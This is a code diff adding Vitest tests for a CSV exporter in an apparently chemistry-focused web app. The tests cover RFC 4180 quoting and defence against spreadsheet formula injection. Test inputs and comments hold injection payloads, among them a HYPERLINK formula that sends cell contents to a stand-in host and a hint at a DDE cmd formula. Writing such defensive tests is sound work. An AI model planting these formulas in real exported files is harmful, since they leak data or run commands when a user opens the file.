@@ -14,7 +14,7 @@
 
 import { afterEach, describe, expect, it, vi } from 'vitest';
 import { cleanup, render, screen } from '@testing-library/react';
-import { rendererFor } from '../src/results/renderers.tsx';
+import { rendererFor, toCsv } from '../src/results/renderers.tsx';
 import type { Json } from '../src/results/shape.ts';
 
 vi.mock('../src/auth/AuthContext.tsx', () => ({
@@ -148,5 +148,36 @@ describe('a compact card keeps every sentence that qualifies the data', () => {
       true,
     );
     expect(screen.getByText(/the ligand we call L7/)).toBeTruthy();
+  });
+});
+
+describe('the CSV a chemist opens in Excel', () => {
+  it('quotes by RFC 4180 and doubles an embedded quote', () => {
+    expect(toCsv(['name', 'note'], [{ name: 'THF, dry', note: 'he said "no"' }])).toBe(
+      'name,note\r\n"THF, dry","he said ""no"""',
+    );
+  });
+
+  it('neutralises a cell a spreadsheet would run as a formula', () => {
+    // Excel, LibreOffice and Sheets all evaluate a cell beginning `=`, `+` or `@`. Every string in
+    // these tables came from outside the browser — a solvent name the corpus was asked about, a
+    // reagent on a run sheet — and the payload is a tool result, not a constant. The classic form
+    // is `=HYPERLINK("http://…"&A1)`, which runs when the chemist opens the file rather than when
+    // anyone reviews it. Quoting does not help: `"=cmd|…"` evaluates identically.
+    const csv = toCsv(
+      ['name'],
+      [{ name: '=HYPERLINK("http://x/"&A1)' }, { name: '+1' }, { name: '@SUM(A1)' }],
+    );
+    for (const line of csv.split('\r\n').slice(1)) {
+      expect(line.replace(/^"/, '').startsWith("'")).toBe(true);
+    }
+  });
+
+  it('leaves a negative number alone, because every table here has some', () => {
+    // The prefix is a real cost — it changes the value a spreadsheet reads — so it is spent only
+    // where there is a formula to stop. `-40` is a temperature.
+    expect(toCsv(['t'], [{ t: -40 }])).toBe('t\r\n-40');
+    // A leading `-` in front of something that is not a number is a different matter.
+    expect(toCsv(['t'], [{ t: '-1+1e1*A1' }])).toBe("t\r\n'-1+1e1*A1");
   });
 });
